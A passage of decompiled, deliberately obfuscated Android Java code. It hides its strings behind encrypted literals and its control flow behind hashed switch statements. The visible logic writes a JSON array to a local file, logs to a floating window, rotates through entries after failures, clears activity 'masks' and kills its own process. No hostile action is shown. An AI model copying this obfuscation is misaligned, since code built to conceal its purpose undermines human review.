                                            jSONArrayOptJSONArray = jSONObject.optJSONArray(l2.decrypt("HJosAswdTKEXgCQVzjlc\n", "fvZNYadcL9U=\n"));
                                            String str57 = "ۡۙۥۘ۬ۖۛۧ۠ۡۙ۟ۘۙۨۨۢۖۗۨۘۚۗۖۘ۫ۛۨۘۛۡۘۘۥۥۛۡۦۖۙ۬ۥۜۦۡۙۜۘۢۥۨۘ";
                                            while (true) {
                                                switch (str57.hashCode() ^ (-1539988239)) {
                                                    case -847652625:
                                                        String str58 = "۬۠ۧ۫ۜۨۚۤ۟ۡ۬ۦ۠ۦۘۜ۫ۢۤۙۚ۠۟ۘۢۘۥ۠ۦۘۨۙۖۘۦۛۖ";
                                                        while (true) {
                                                            switch (str58.hashCode() ^ (-182899038)) {
                                                                case -2142399427:
                                                                    str58 = "ۛۙ۬۫ۛۦ۬ۦۧۘۥۜۙۗۗۡۜۥۘۘۨۜۧۘۖۥۚۥۜۢ۠ۡۡۘ۫ۡۚۙۧ۫۟ۡۙۥۨۙ";
                                                                case -81048370:
                                                                    str58 = jSONArrayOptJSONArray != null ? "۫ۦ۫ۙ۬ۧۥ۟ۙۛۗۙۤ۫ۦۘ۫ۚۛۙۘۥۘۤۧۙۢۢۨ۟ۨ۠۠ۦۘۙ۠ۥۚۤۤۧ۬ۦۘۘ۟ۡۘۡۧۦ" : "ۗۡۢۧۜۧۦۥۦۤ۟ۖۗ۬۬ۧ۠ۦۜۧۡۘ۫ۜۥۘۛۡۨۘۖۖۨۧۥۥۨ۫ۧ";
                                                                case 710486855:
                                                                    str57 = "ۖۘ۬ۥۜۨ۟ۘ۟۠ۤ۠ۨۨۙۤۜۛۨۘۙۖۚۙۨۡۡۦ۟ۜۘۢۛۦۡۧۘ۬۟۟۠ۛۦۘۘۘۘۜۡۘۘ";
                                                                    break;
                                                                case 1029562066:
                                                                    str57 = "ۦۗۙۡ۟ۢۦۢۘۘ۠ۤ۟۠ۧۨۘ۬ۤۢۧۢۖ۫ۧ۠ۚۖۘۘۜۨۤۜۧۥۘ۬ۙۡۜۛۚۡۘۘۘ۠ۨ۠ۨ۟ۤ";
                                                                    break;
                                                            }
                                                        }
                                                        break;
                                                    case -448164934:
                                                        try {
                                                            FileWriter fileWriter = new FileWriter(new File(context.getFilesDir(), l2.decrypt("s2wgN7jyiu2laTc9p8SO/Y5jIDe7yMXkom8v\n", "0QBBVNOt644=\n")), false);
                                                            try {
                                                                fileWriter.write(jSONArrayOptJSONArray.toString(2));
                                                                fileWriter.flush();
                                                                fileWriter.close();
                                                                break;
                                                            } finally {
                                                            }
                                                        } catch (Exception e11) {
                                                            k2.logToFloatingWindow(l2.decrypt("3JXbRyfoDJmgy8w7UuBM8ZGfohYSilWO\n", "NS5Kordl6RQ=\n") + e11.getMessage(), l2.decrypt("FF9fWM0=\n", "cS0tN7+60uM=\n"));
                                                            break;
                                                        }
                                                    case 1297704453:
                                                        str57 = "ۘۧۜۜۛۙۛۜۘۘ۫ۜۖۜۛ۟ۧۤۖۘۚۖ۬ۤ۟ۘۢۖۦ۠ۦۡۘۤۧۤ۬۠ۘۙ۟ۡ۟۫ۙۙۤ۫ۢۛۜ۠ۤۛ۟ۥ";
                                                    case 2054754818:
                                                        break;
                                                }
                                            }
                                            break;
                                        case 2066923266:
                                            str31 = "۬ۤۜۢۢۜۘۤۦۜۚۢۨۘۗۥۧۘۙۙۢۦۧ۬۬ۨۦۨۗۜۦ۬ۨۘ";
                                    }
                                }
                                break;
                            case -687582756:
                                String str59 = "ۤۢۡۘۤۗۧۛۧۦۘۢۥۨۘۡ۟ۚۡۘ۠ۗ۠ۚۥۡۥ۫۟ۦۤ۫ۧۥۦۛۗ۫ۗۚۙۗۚۦۗ۠ۖۜۘ۬۫ۥۘۛۜ۬ۥۥ۠";
                                while (true) {
                                    switch (str59.hashCode() ^ (-1943963580)) {
                                        case -1919374069:
                                            str6 = "۠ۛۨۡۡۨۚ۠ۜۘۜۨۗۛ۫۫۫۬ۦۧۘۦ۟ۨۦۘ۠ۦۦۧۜۧۘ۬۬ۙۧۚۜۙۥۥۖ۠ۖ";
                                            break;
                                        case -1152387869:
                                            str59 = "ۨۜۨ۫۬۬ۚ۟۟ۨۥۢۖۤۧ۠ۛۥۘ۬۟ۘۤۡۧ۫۬ۨ۬ۦۧ۬ۢۗ۠ۧۖۚۥۘۘۦۡۧۨۚۚۖۘۜ۫ۚۗۚۖ";
                                        case -231265668:
                                            str59 = i == 200 ? "ۥۜۦۖۖۡۚ۬ۡ۟۫ۗ۬۫ۨۘ۫ۜ۟ۜۙۗ۠ۜۥۘۘ۬ۗ۬ۦۖۘ" : "ۤۛۛۥ۟ۡۥۛۢۛۨۘ۬ۖۘۧۢ۫ۡۨ۬ۦۙۧ۟ۦۥۘۚۧ";
                                        case 940440542:
                                            str6 = "ۚۙۥۘ۟ۗۖۘۖۖۥۧۨۨۘۢۤۡۘۤۨۢۖۚۡۡۡۥۤۙۛۥۙۚ";
                                            break;
                                    }
                                }
                                break;
                            case -85272491:
                                str6 = "ۡۡۡۥۖۧ۠۫ۤ۟ۥۡۤۦۚۥ۬ۖۢۤۦۢۖۢۙ۫ۡۤ۫ۖۢ۬ۜۘۙۦۨۜۢۗۢۤۢۧ۫ۤ";
                            case -20826937:
                                k2.logToFloatingWindow(l2.decrypt("mj4re2jXYR/DeSg4+Tbr3xes\n", "cpGcndlVhLs=\n") + i + l2.decrypt("F3w+J8kwF/5oTluRo38qjg==\n", "+MCyFi6XhRs=\n"), l2.decrypt("f4+0k10=\n", "Gv3G/C/H3yI=\n"));
                                iArr3[0] = iArr3[0] + 1;
                                str7 = str8;
                                break;
                        }
                    }
                } catch (Exception e12) {
                    e = e12;
                }
            } catch (Exception e13) {
                e = e13;
            }
            str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
            while (true) {
                switch (str2.hashCode() ^ (-296637591)) {
                    case -2051262072:
                        str2 = "ۘ۠ۖۘ۬ۦ۬ۚۖ۬ۙۥۜۘۥۗۤ۬۠ۨۥۡۡۘ۠ۚۢۦ۠ۖۘۚۦۗۘۤ۠ۙۜۘۖ۫ۙۛۢ";
                    case -660958403:
                        break;
                    case -203741106:
                        String str60 = "ۡۖ۟ۢۛۘۘۙۗۧۢۥۘۚۙ۬ۖۘۢۙۖۘ۫ۧۧۧۢ۫۬ۜۚ";
                        while (true) {
                            switch (str60.hashCode() ^ 343609868) {
                                case -1222369532:
                                    str2 = "۟ۙۦۖۥ۟ۦۖۖۘ۟ۜۜۚۥۜۘۧ۫ۗۙۜۡ۫ۦۨۥۙۖۘۖ۬ۛۙ۟ۡۨۛۘۖۦۘۖۖۥۘ";
                                    break;
                                case 28093391:
                                    str60 = "ۤۜۚۦۙۘۘ۫ۢۨ۬ۙۘۘۥۧۢ۬ۘۚ۫ۡۨۘۨۜۨۘۨۨ۟ۧۥۨ۟ۚۦۛ۫ۖۚۢۗ۫ۥ";
                                case 1749546784:
                                    str60 = iArr3[0] >= 3 ? "ۢۗۨۢۚ۫ۢۥۢۜۧۜۥۚۖ۠ۤۘۘۦ۟ۡ۠ۧۤۢۛ۠ۧۗۖۘ۬ۖۢۨۨۜۘ" : "۬ۦۢۤۤۗۨۖۡۘۜۛۦۘ۠ۖۥۘۗ۫ۚۖ۠ۦۘۨۡۢۤۧۦۚ۟ۡۢۘۨۘۗۗۨۙۨۧۥۤ۫";
                                case 2059529774:
                                    str2 = "ۗۗۚ۫ۘۘۡۧ۠ۖۛۤۡۛۨۘۢۛۖۘۤۨۜۘۤۜ۫۫۫ۢۡۨۨۘۦ۟ۜۘ۟ۙ۬ۙۖۦۘ۬";
                                    break;
                            }
                        }
                        break;
                    case 750215639:
                        iArr3[0] = 0;
                        String str61 = "ۛۙۤۡۥۗۤۗۥۧ۟ۚۥۜۥۘۦۥۘۗ۫ۛۗ۬ۖۘ۟ۘۡۤۧۥۦۗۡۚ۬ۤۤۨۚۘۘۨۘ";
                        while (true) {
                            switch (str61.hashCode() ^ (-1574291461)) {
                                case -1879377402:
                                    str61 = "ۦۢۜۛۖ۫ۙۡۧۘ۬ۦۚ۟ۡۧۘۦۙۢۨۢۗۤۡۛۤۡۘ۫ۗۨۘۖۚۘۖ۠ۜۚۨۦۖ۟ۜۢ۟ۙۢۤ";
                                case -1578792334:
                                    int length = (iArr2[0] + 1) % i.a.length;
                                    iArr2[0] = length;
                                    String str62 = "ۨۢۡۘۗۤۘۡۧۡۘۜ۫ۡۢۚۢۨۤ۫ۛۥۥۥۜۡۤۤۧۧۥۖۘۧۥۘۡۖ۬ۘۡۙۚۜۚ۠ۘۛۡۘۘ";
                                    while (true) {
                                        switch (str62.hashCode() ^ 710210850) {
                                            case -1901349082:
                                                break;
                                            case -1022059464:
                                                zArr2[0] = true;
                                                String str63 = "ۙۡ۠۬ۚ۠ۜۢۛۘۧ۬ۥۘۘۡۦۘۥۥۚۤۘۖۗۛۛ۠ۥۢۘ۫ۡۚ۬ۤۘۨۗۜۚ۬ۜۘۢۖ";
                                                while (true) {
                                                    switch (str63.hashCode() ^ 964396858) {
                                                        case -1351257109:
                                                            break;
                                                        case -1116934013:
                                                            String str64 = "۠ۖۗۥۖۚۦۚۨۘۥ۬۟ۤۖۦ۠ۤۖۘۥ۠ۨۘ۠ۙۘۧۤ۟ۥۘۙۢۖۚۧۨۘ";
                                                            while (true) {
                                                                switch (str64.hashCode() ^ (-1482854574)) {
                                                                    case -1554532343:
                                                                        str64 = z ? "ۙۥ۟ۨۥۜۘ۟ۘۗ۬ۦ۟۟ۥۢۜۙ۬ۙ۬۟۬۟ۘ۟۫ۨۘۧۘۢۢۖۛ۟ۜۦۘ" : "ۜۛۦۙ۬ۥۘ۫ۜۖۤۛۦۘۙۗۦۘۘۙۨۙۘۥۘۨۧ۟۫ۦۡۘۚۛۛ۠۬ۤۖ۠ۗۥۙۢۙ۫ۚ۠ۧۖۘۚۜ۟";
                                                                    case -855609081:
                                                                        str63 = "ۨ۫ۖۡۥۥۘۡۦۥۘ۫ۡ۠۫ۖۘۙۨۥۦۚۨۘۛۥ۟ۛۗۖۘۢۘۥ";
                                                                        break;
                                                                    case -319953076:
                                                                        str63 = "ۡۢۗۧ۬۬ۤ۫ۤۜۡۡۘۖۜ۬ۜۚ۠ۛ۠ۦۜۡۤۧۗۘ۠ۘۛۨۦۙ۬ۙۦۘ۟ۥۜۘ۠ۧ۠ۘۤۘۢ۟";
                                                                        break;
                                                                    case 1447336466:
                                                                        str64 = "ۙۡۘۧۘۘۥۤۜۗۡۥۘۚۜۖۘۖ۫۠ۜۢۦۚ۬۠ۘۤۥۘۘ۟ۜ۟ۘۗۧ۠ۥۥۛۖۘ۬ۨۖۘۨۨۨۛۘۚۢۚ۫ۡۤۗ";
                                                                }
                                                            }
                                                            break;
                                                        case 141329969:
                                                            String str65 = "ۨۦ۠ۖۤ۫ۢ۟ۨۘۚۨۖۘۜۖۦۘۜۡۨۙۚۨۘۗۤ۬ۜۖ۠۫ۜۦ۠۬ۛ۟ۖۖۜۘ۟ۥۡ۟ۛۛۚۘۨۘۡۜۖۘ۟ۖ۟";
                                                            while (true) {
                                                                switch (str65.hashCode() ^ 978071214) {
                                                                    case -886921599:
                                                                        str65 = "۫ۨۤۙ۫ۜۖ۠ۜۢۥۧۘ۟ۚۘ۬۠۫ۥۖۥۚۨۡۘۜۘۗ۬ۜۦۘ۠ۨۡۘ۠ۛ۫ۥۧۧۜۘۥۤ۟ۡۘۚۧۖۘۚ۠ۘۘ۬ۖۖ";
                                                                    case -87384833:
                                                                        break;
                                                                    case 5605124:
                                                                        break;
                                                                    case 476923713:
                                                                        String str66 = "۬ۥۨۘۗۥۧۡۤۨۘۙۙ۠ۘۦۖۛۥۚ۬ۦۘۘۚۡ۬ۛۡۡۡۘۛۙۨۘۗۧۥۚۡ۬۬ۗۥۥۜۧۘۥۢ۟";
                                                                        while (true) {
                                                                            switch (str66.hashCode() ^ 1061869048) {
                                                                                case -1996725173:
                                                                                    str65 = "ۚۛۖۘۛۘۙۛۖۥۤۧۖۘۖ۬ۖۧ۬ۦۘۡۗ۫ۡ۬ۥۗۨۨ۟ۚۜ۬ۜۙ۫ۨ۠";
                                                                                    break;
                                                                                case -547149105:
                                                                                    str66 = "ۗۡۥۚۧۚۜۘ۟ۖۖ۟۬۬ۘ۫ۨۘۦۜۨۢۥۜ۠۠ۨۦۚۥۘۗۙۚۧ۠ۜۘۚۙۚ۬۫ۨۖۡۘ۫ۡۘۘ۟ۤۛۧ۠ۨ";
                                                                                case 1673438962:
                                                                                    str66 = zArr[0] ? "ۡۘۘۘۖۚۖۘۡۦۘۡۘۧۘۦۙ۠ۧۨۡۗ۬ۥ۠ۖۖۘۡ۠ۥ۠ۚۜۘ۟۫ۚ۬ۚۡۖ۫ۢۗ۫ۧۦۨۡۘۨۜۚۘۛۗۡۘۥ" : "ۥ۬ۢ۫ۧۧۚ۬ۜۘۢۘۜۘۜۖۘۚۛۢ۠ۘۘۛۤۥۘۖ۫ۧ۬ۛۙۖۢۦۘۥ۬ۚۖ۬ۙۢۡۡ";
                                                                                case 1704754432:
                                                                                    str65 = "۬ۚۨۖ۟ۨۛۖۘۘۢۘ۫ۗۦۘۤ۟ۜۘۤۡۡۙۖۤۥ۠ۦۛۖۘۘۥۢۚۨۖۜۘ";
                                                                                    break;
                                                                            }
                                                                        }
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                        case 1818394901:
                                                            str63 = "۟ۢۡ۠ۛۜۖ۟ۡۘۢۖۧۘ۫ۛۖ۟۬ۢۘۤۤ۫۠۬ۧۜۖ۠ۢۥۘۖۥۘۨ۫۫ۜۨۤ۠ۡۧۘ";
                                                    }
                                                }
                                                iArr4[0] = iArr4[0] + 1;
                                                zArr[0] = false;
                                                zArr2[0] = false;
                                                k2.logToFloatingWindow(l2.decrypt("MYKgMKLG9Dd0+6dn2uieYFyO93mTZg==\n", "1B4Q1T9GEoY=\n") + iArr4[0] + l2.decrypt("lqqI3Vcv1PcZ1w==\n", "tkI1c7KfSR8=\n"), l2.decrypt("LDQX0Q==\n", "W1Vlv9u8nts=\n"));
                                                String str67 = "۠ۘ۬ۗۛۛۛۗۢۦ۠ۢۘۛ۠ۜ۟ۜۗۦۥۘۖۘۦۗۡۢ۟ۤۡ";
                                                while (true) {
                                                    switch (str67.hashCode() ^ 890574086) {
                                                        case -1910166214:
                                                            str67 = "ۗۙ۠ۜۗۜۢۜۨۥۡۤۙۖۘۚۡۥۘۛۨ۬ۧۜۜۘ۫ۥۖۥۚۨۘۤۚۖۧ۬ۡ";
                                                        case -1854408509:
                                                            k2.logToFloatingWindow(l2.decrypt("s7f4TWNwVe7n6sEoIFYQl+C9tS9LAhT/dz18QHtJX87b6+clIHsamtm4uSdQAjjCvorRT3tJX87b\n6Oc7IHovmuiUuwBN\n", "Vw9cqMbnsHI=\n"), l2.decrypt("/+1LULE=\n", "mp85P8MgDQI=\n"));
                                                            ActivityKeeper.clearAllMasks();
                                                            String str68 = "ۖۚۦۘ۠۠ۜۘۚۤۙۧۢۤۤۘۧۜۧۛۡۜۘۨۗ۠ۦۨۧۘۛۤۨۚ۟ۡۘ۫۟ۘۘۛ۠ۚ۠ۖۦۥ۫ۥ۬۫ۜۘ۠ۜ۠ۛۘۤ";
                                                            while (true) {
                                                                switch (str68.hashCode() ^ 1747359548) {
                                                                    case -1982084511:
                                                                        Process.killProcess(Process.myPid());
                                                                        return;
                                                                    case -1967804087:
                                                                        str68 = "ۧۚۨۘۜۙ۬ۗ۟ۗۤۗ۠۫ۤۚۜۙۛ۟ۦۡۡۙۡۘ۫۟ۦۘۖۤۨۜۡۦۧۢۥۘ";
                                                                        break;
                                                                    case 1456125279:
                                                                        String str69 = "ۚۜۗۡۦۧ۟ۛ۬۬ۚۖۨۥۜۘ۠ۗۙۖۜۘۜۚۥۘۚۥ۬۠۠ۡۘۡۤۦ۠ۥۧۨۙۡۙۘۖۘ";
                                                                        while (true) {
                                                                            switch (str69.hashCode() ^ (-2003600743)) {
                                                                                case -2076922880:
                                                                                    if (!Objects.equals(fcRuQsQrcxOAzxwEalcM.NETWORK, l2.decrypt("TsZZOPsOl99exko=\n", "FeUXfa9Z2I0=\n"))) {
                                                                                        str69 = "ۡۗۛۙۢۚۨۤۨۘۚ۠ۥۢۜۜۘ۬ۥ۟ۢۘ۠۠ۗۧ۠ۗۘۘۢۧۖۘ۫ۥ۬ۛۡۤ۟ۥۘۙۘۧۘ";
                                                                                        break;
                                                                                    } else {
                                                                                        str69 = "۫ۙ۬ۦۙۨۗۖۖۚۤۚ۠ۛۧۧۡۘۘ۫ۚ۠ۗۧۛ۫ۛۤۚۥۛۜۦۦۘۦۡۢ۬ۚۜۘۚۨۛۖۚۖۖۛۚ۫ۡۢۤۥۘ";
                                                                                        break;
                                                                                    }
                                                                                case -1878932532:
                                                                                    str68 = "ۥۨۚۢۗۨۘ۠۬ۗ۟ۚۗۖۧ۫ۛۦۖ۠ۤۙ۬۫ۡۙ۫۠ۦۖۥۘۛۢۙۖۛۦ";
                                                                                    continue;
                                                                                case -1290576240:
                                                                                    str68 = "ۨ۬ۨۘۤۡ۠ۘ۠ۨ۫۠ۢۤۢۘۘۤۗۜۘۤۧ۬۬ۜۗۨۦۖۘۖ۫۬ۛۛۨۘۧۨۦۘۦۜۧۘ۫ۨۖۘۥۛۚ۬ۧۨۡۨۜۘۢۧۖ";
                                                                                    continue;
                                                                                case 715139531:
                                                                                    str69 = "ۗ۫ۚۙۢۢۡۡۖۘۜۘۗۥۘۨۘۛۚ۬ۖۖۡۘۨۗۧۤۜۢۡ۫۬";
                                                                                    break;
                                                                            }
                                                                        }
                                                                        break;
                                                                    case 1507577904:
                                                                        return;
                                                                }
                                                            }
                                                            break;
                                                        case 1330546915:
                                                            String str70 = "۟ۥۧۥۜۘۘ۬ۦۨۖۤ۫۟ۡۘۖ۬ۥۜۛۥۘۙ۬ۥۘۖۧۜۘۧ۫ۖۧۜۦۘ۫۠ۦۜ۬ۢۥۙ۬";
                                                            while (true) {
                                                                switch (str70.hashCode() ^ 2069180341) {
                                                                    case -728585592:
                                                                        str67 = "ۤ۟ۦۘ۫ۛۚۛۢۤۚۜۤۜۘۚۤۡۙۤۚۙ۟ۘۢۤۖۘ۬ۛۜۘۨۘۦۛۥۙۦۥۦۨۙۙۘۨۘۨۖۗۤۥۗ۠ۢۘ";
                                                                        break;
                                                                    case 342103318:
                                                                        str70 = iArr4[0] >= 2 ? "ۧ۠۫ۙۡ۬۠ۨۘۢۙۧۧۡ۬۟ۤۖۨۡ۠ۢ۫۫ۢۚۚۚۢۘ" : "ۨۘۦۖ۫۬ۜۧۤۥ۠ۘۖۦۨۛۥۧۚ۟ۡ۠ۥ۠ۢۗ۟ۚۡۘۢۗ۠ۦۢۡ۠۬ۥۘۨۥۡۘ";
                                                                    case 1420518001:
                                                                        str67 = "ۘۢۨۘۗ۫ۘۤۙۥ۟ۗۖۖۘۛۚ۠ۚۦۚۛ۫ۢۖۤ۫ۚۤۘ";
                                                                        break;
                                                                    case 1576577263:
                                                                        str70 = "ۘۙۛۛۨۡۧۛۧۧۜۜۘۚۚۦۢ۬۠۠۟ۦۛۜ۫ۘ۠ۚۘۥ۬ۧۡۘۡۧ۟ۖۡۜۘۖۛۜۘۘ۬ۚۢۘۨۘۤۚۡۙ۟ۖ";
                                                                }
                                                            }
                                                            break;
                                                        case 1495886656:
                                                            break;
                                                    }
                                                }
                                                iArr[0] = !z ? 1 : 0;
                                                break;
                                            case 302486137:
                                                String str71 = "۬ۦۖۘ۫۠ۙۜۧۤۖۦۦۢۧ۫۫ۧۦۗۘۧ۫ۙۤۚۥۛۛ۫۠ۚۘۢۚۤ۠";
                                                while (true) {
                                                    switch (str71.hashCode() ^ 504028155) {
                                                        case -1828952854:
                                                            str62 = "ۡۨ۠۟ۛۜ۠ۜ۠ۖۡۥ۠ۦ۟۟ۖ۟ۥۡۤ۟ۙۡۘۦ۫ۗۜۛۨۘۚۖ۠ۜ۫";
                                                            break;
                                                        case 170509168:
                                                            str71 = length == 0 ? "ۥ۬ۦ۟۬ۜۘۡۢۥ۫ۦۧۜۚۤ۫ۚۢ۫ۡۚ۫ۗۜ۠ۜۡۤۛۚ۬ۨۘۦۚۥۘ۠ۛ۬۫ۧۧۜ۟ۜۨۚۥ" : "ۡۨۛۧ۟ۘۘۥۨۖۚ۠۬ۡ۫ۘۘۖۨۘۡۚۜۖ۟ۘ۟ۙۢۘۖۘ";
                                                        case 1319093675:
                                                            str71 = "ۚۧۚۘۦۨۗۢۖۘۢۘۡۙۨۤۥۙۦ۠۫ۨۧۜۗۗۘۦۦۗۖۘۙۗۚ۫۟ۨۧۘۧۘ۟ۛ۬";
                                                        case 1595059872:
                                                            str62 = "ۚۙۛۡۢۜۥۖۦۘۡۙۨۘۦۘ۟۬ۤۦۘ۬ۡ۠ۥۢۤۘ۠ۦۗۥۘۨۡ۟ۚۘۤۢ۫ۖۘۜ۟ۡۘ۠ۥۘۘ۟ۨ۬";
                                                            break;
                                                    }
                                                }
                                                break;
                                            case 1167260093:
                                                str62 = "ۙۖۘ۫ۤۛ۟ۧ۟ۡۙۨۘۜ۫ۡۡۚۜۘ۟ۘۘۘ۫ۨۘۛۛ۠ۧۘۧۘۚۨۖۘۤۛ۟ۘ۟ۡۘۨ۬ۜۘۢۘ۫ۗۗۨ";
                                        }
                                    }
                                    break;
                                case -467254929:
                                    int length2 = (iArr2[0] + 1) % strArr.length;
                                    iArr2[0] = length2;
                                    String str72 = "ۛۖۖۡۘۡۘۦۧۨۙۖ۬ۘۘۡۗۗۥۨۜۙۚۜۚۨ۠ۜۢۜۘ۬ۢۢ۟ۖ۟ۘۦۘۧۚ۠";
                                    while (true) {
                                        switch (str72.hashCode() ^ 373935389) {
                                            case -635912355:
                                                break;
                                            case -162401636:
                                                String str73 = "ۥۧۜۘ۬۠ۦۤۙۦۘۧۙۨۘۛۢۥۦ۬ۦۘۨۘۘ۬ۘ۫۫ۜۘ۫ۧۘۤۡۖۘ۬ۖۘۘۗۡۚۘۤۤ";
                                                while (true) {
                                                    switch (str73.hashCode() ^ 702946545) {
                                                        case -1393218859:
                                                            str73 = "ۙ۬۫ۧۧۖۘۨۗۢ۬۫۬ۦۦ۬ۜ۫ۖۘۤ۬ۦ۫ۙۧۜۛۢۜ۬۬۫۟ۘۦۢۨ";
                                                        case -609751769:
                                                            str73 = length2 == 0 ? "ۥ۬ۚ۠۬ۢ۫ۢۘۡۜۦۖۡۗۥۢۧۦۖۜۘۡۚۦ۠ۧۘۙۡۖۘۘۘۗۖۖۦۘ" : "ۗۘۨۘۧۘۦۚۜۜۘۛۦۘۙۨۦۘۗۘ۠ۛ۠ۥۘۨۘۖ۟ۗۘۦۦۤۛۚ۫ۡ۬۬۫ۨۛۦۗۥ";
                                                        case -252269413:
                                                            str72 = "۟۫ۘۘۘۦۨۛۢۜ۟ۘۦۡۤ۠۬ۗۨۙ۟ۢ۬ۥۘۚ۫۟ۧۢ۟ۤۙۦۘۤۖۙۙۨۦۘۘ۫ۜۘ۫۬ۜۘۥ۠ۡۘ";
                                                            break;
                                                        case -193447052:
                                                            str72 = "۫ۖۙ۟ۧۨۘ۬ۗۜۘۜۚۘۗۚۖۥۛۢۚۘۦۗۖۗۦۢۛۨۘۛ۫ۦۡۛۛۥۛۢۙۙۘۡۘۦۢ۫ۘ۟ۘۘۖ۠ۨۘۧ۫";
                                                            break;
                                                    }
                                                }
                                                break;
                                            case -155182032:
                                                str72 = "ۥۛۚۦ۫ۦ۠ۖۗ۬ۦۧۘۤۢۛۥۛ۬ۥۦ۬ۢۖۗۙ۟۠۠۟ۤ";
                                            case 1367928726:
                                                zArr[0] = true;
                                                iArr[0] = 1;
                                                break;
                                        }
                                    }
                                    break;
                                case 686457253:
                                    String str74 = "ۘۙۦۧۜۖ۫ۡۡۘۛۙ۟ۗۤۘۘۙۤۦۦۦ۠ۚ۠ۨۘ۬ۤۡۘۤۙۙ";
                                    while (true) {
                                        switch (str74.hashCode() ^ 863257620) {
                                            case 291745680:
                                                str61 = "ۨۛۧۚۚ۬ۦۜۤۛۡۧ۠ۘ۟ۖۚۦ۠۠۬ۧۖۖۥ۬ۥۙۖۤۘۛۗ۬۟ۨۢۤۚ۫ۥ۫ۢۛ۫۫ۡۥۙ۟ۤ";
                                                break;
                                            case 911390439:
                                                str74 = "ۢۗۗ۠ۗۡۘ۟ۡۨۘۗۖۥۘۤۤ۫ۜۙۨۘۦ۫۟۟ۙۧ۟۠ۧ۟ۜۦۘۚۘ۠ۥۨۨۘۙۗۥۗۘۤۤ۠ۡۘۤ۠ۖۘ";
                                            case 1675981057:
                                                str74 = iArr[0] == 0 ? "ۡۨۢ۫ۖۦۘۜۨۦۛۙۧۗۙ۫ۧۧ۠ۘ۟ۥۦۦۖۥۘۧۘۥۨۛۚۤ۟۫ۡ۠ۢۢ۠ۜ۠ۖ۠۠ۛ۟ۚۤ" : "ۛۦۨ۫ۡۘۘ۟ۥۘ۟ۛۙۜۥۢۧۤۗۧۡۤۢۦۛۚۛۤۖۢۘۨۦ۟ۥۘ";
                                            case 1783061067:
                                                str61 = "ۗ۫۬ۚۨۘۘۨۗۖۘۚۢۨۘۙۨۥۜۘۘۘۚۤۖۘۨۢۜۦۚۘۘ۟ۛۦۨ۟ۜۘۗۗ۟";
                                                break;
                                        }
                                    }
                                    break;
                            }
                        }
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append(l2.decrypt("Bbh+hkw9h0xX1kjiJAPfBn2wFtxb\n", "4DD5YMGfb+M=\n"));
                        String str75 = "ۗۛۛۜۜۖۘۡۡۡۘۜۧۨۘ۠۟ۘۘۥۧۜۦۚۜۖۡۙۗۤۜۘ۠ۚۦ۟۬ۖۘ۟۟ۧۨۜۧۘ۠ۡۨۘ";
                        while (true) {
                            switch (str75.hashCode() ^ 888973084) {
                                case -2141852478:
                                    str3 = i.a[iArr2[0]];
                                    break;
                                case -520808381:
                                    str75 = "ۤۡۡۤۚ۫ۦۗۖ۟۠ۥۦ۠ۦۘۘۚۙۗ۟۟ۥ۬ۙۜۚۚۘۚۖ";
                                case 1334065565:
                                    String str76 = "ۚ۬ۦۘۤ۫ۚۗۙۦ۟ۤۢۧۛۛۖۢۤۥۦۥ۫۫ۤۛۙۧۙۦۙۗۗۥۛۛۙۡۖۘۘۖۧۜ۬ۜۘ۫۠ۨۘ";
                                    while (true) {
                                        switch (str76.hashCode() ^ 1711375535) {
                                            case -672863367:
                                                str76 = "ۛۙۥۨ۠ۦۜۧۛ۟ۛۖۦۦۗۛۛۜۘۨۘ۠ۥ۠ۦۦۘۘ۠۬ۦۘ۟ۦۚۡۘۖ۫۠ۦۗۡ۟۫ۛۥۘۗ۬ۘۘ";
                                            case -462442752:
                                                str75 = "۬ۗۜ۠ۦۗۢۥۤۦۖۘۙۙۥۜۜۚۦۧۖۖۧۜۘ۫ۧ۬ۛۦۨ۠ۜۙۗۥ۬۬ۙۢۤۖۖۦۦۛۜۥ۠";
                                                break;
                                            case -226390985:
                                                str75 = "ۙۧۜۘۦۧۥۚ۟ۨۘۢۡۦۜۛۥۧۗ۠۟ۙۦۛۗ۬ۥۡۖۘۗۢۗۖۦۥۘۦۘۛ";
                                                break;
                                            case 97186920:
                                                str76 = iArr[0] == 0 ? "۫ۡۛۤۥۚۚ۠۠ۤۧۦۗۚۧ۬ۧۛ۟۬۟ۦ۬۟ۤۢۜۖۖۧۙۦۘۘۧۜۘۧۨۨۢۖۜۢۘۛۦۘ۟" : "۫ۢۦۖۦۙۨۨۥۗۤۨۘۜۦۥۘۜۗۥۘۨۚ۠ۦۚۖۘۚۛۗۤۨ۬۬۠ۨۘۨ۠ۗ";
                                        }
                                    }
                                    break;
                                case 1343129458:
                                    str3 = strArr[iArr2[0]];
                                    break;
                            }
                        }
                        sb4.append(str3);
                        k2.logToFloatingWindow(sb4.toString(), l2.decrypt("ub0VEw==\n", "ztxnfbY6onU=\n"));
                        break;
                }
            }
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException e14) {
            }
        }
        Activity activityECt8jHZ4 = Utils.ECt8jHZ4();
        String str77 = "ۛۡۗۧۗ۫۫۫ۖ۠۫۠ۛۗ۠ۙ۫۠ۢۚۛ۫ۧۤۥ۫ۖۖۛۛۛۛۦۘۙۘ۫ۨۧ۬ۜۧۤ۠ۧۛۢ۫";
        while (true) {
            switch (str77.hashCode() ^ (-1384210367)) {
                case -803150268:
                    break;
                case 1049813465:
                    String name = activityECt8jHZ4.getClass().getName();
                    int i5 = 0;
                    while (true) {
                        String str78 = "۟ۤۢ۟ۖ۬ۗۥۜۘۨ۟ۖۤ۬ۖۘۦۛۜۘۘۧۖۘۛۙۜ۫ۥۜۘۨۗۢ";
                        while (true) {
                            switch (str78.hashCode() ^ (-463483722)) {
                                case -1095600226:
                                    String str79 = "۟ۘۘۦ۬ۗۚۙۡۜۖۘۘۗۙۘۘۜ۫ۗ۠۠ۘۧ۠ۗۚۙۥ۫ۧۨۘ۠ۨ۠ۦۘ۫۠ۤ۬ۜۚۧۚۥۡۘۦۖۤ";
                                    while (true) {
                                        switch (str79.hashCode() ^ 1637471782) {
                                            case -1439939063:
                                                str78 = "۬ۧۦۖ۠ۡۘۨۨۨ۬۟۬ۢۦۥۛۤۖۢۨۛ۠ۡۡ۬ۛۤ۟۟ۡۚۦۘۗۨ۫ۡۧۥ۟ۛۖۨۘۧۘۙۧۡ۠ۧۚۖ۠ۡۘ";
                                                break;
                                            case -435780804:
